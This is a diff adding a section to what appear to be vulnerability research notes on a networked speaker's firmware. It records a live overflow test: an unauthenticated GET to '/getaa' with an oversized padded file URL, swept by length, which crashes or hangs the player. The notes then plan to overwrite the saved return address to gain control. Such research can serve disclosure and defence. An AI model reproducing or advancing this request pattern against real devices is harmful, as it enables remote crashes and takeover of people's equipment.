@@ -208,3 +208,20 @@ parsers that matter most (JSON, SOAP args, GENA body) clamp.
 Next, in order: (a) identify the vtable callers of the `0x101a0b70` / `0x101cc878` / `0x101ddd2c` cluster
 so the reachable request is named, (b) craft a >5.3 KB URL and a >2.1 KB value on a muted player with
 `/status/zp` before and after plus ICMP. Neither has been run yet.
+
+## Live: the 57.23 URL-span overflow fires
+
+`/getaa?u=x-file-cifs://<host>/SHARE/<N×'A'>.jpg` on the S1 Play:5 (`.202`, 57.23), `N` swept:
+
+| N | answer | player after |
+|---|---|---|
+| 1000, 3000 | 404 (normal, no such file) | up |
+| 5300, 5400, 5800, 6000 | 408 or 000 | up again within seconds |
+| 5600 | **000** (connection dies) | up |
+
+So the fault zone opens at roughly the predicted frame size (the frame is 5 344 with the destination at
+`+16`, so ~5 328 bytes of span is the limit) and the outcome is hang-or-crash rather than a clean return.
+This is a **stack write** primitive reached pre-auth from a single GET, which is the thing the SMB
+over-read lacks. Next: find the exact N where the saved LR is overwritten (the 408/000 split suggests
+the return address is already being clobbered before the frame is fully overrun), and whether the
+overwritten bytes are attacker-shaped enough to steer control.
